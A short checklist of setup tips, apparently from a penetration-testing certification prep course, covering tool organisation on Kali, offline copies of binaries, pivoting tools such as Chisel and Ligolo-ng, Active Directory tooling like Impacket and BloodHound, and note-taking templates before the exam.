1. **Keep tools in `~/tools` with PATH added** — don't hunt for tools mid-exam.
2. **Pre-download ALL Windows binaries** — don't depend on internet during the exam.
3. **Snapshot Kali after everything is installed and verified** — rollback insurance.
4. **For IoT: AttifyOS** or properly configured Firmadyne + QEMU saves massive time.
5. **Impacket and NetExec are non-negotiable** for the AD range.
6. **Chisel or Ligolo-ng + proxychains** is the most reliable pivoting combination reported.
7. **Practice one full pivot scenario** (attacker → pivot → internal subnet → second pivot → DC) before exam day — this must be muscle memory.
8. **Have your note-taking template ready** (screenshots folder, command log, findings table) so you're filling it in, not building it under time pressure.
9. **Test BloodHound + Neo4j** against a lab AD before relying on it in the exam.
10. **Git clone all GitHub tools** before exam day — don't rely on internet access.

---

> **Next:** Move to the OSINT & Reconnaissance module. With tools installed and verified, you're ready to begin systematic enumeration.
